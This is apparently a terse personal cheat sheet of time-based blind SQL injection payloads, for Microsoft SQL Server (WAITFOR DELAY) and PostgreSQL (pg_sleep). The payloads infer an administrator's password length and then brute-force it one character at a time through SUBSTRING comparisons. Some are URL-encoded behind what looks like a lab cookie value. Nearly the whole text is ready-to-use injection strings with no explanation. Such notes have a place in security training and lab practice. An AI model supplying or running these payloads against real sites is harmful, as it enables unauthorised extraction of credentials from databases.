[[postgresql]]

```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```


Testing one by one character
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```


postgresql
```sql
DmPM58WZKAHfc8BB'%3BSELECT+CASE+WHEN+(username='administrator'+and+length(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+from+users--
```
brut force ony by one char:
```sql
DmPM58WZKAHfc8BB'%3BSELECT+CASE+WHEN+(username='administrator'+and+substring(password,5,1)='a')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+from+users--
```

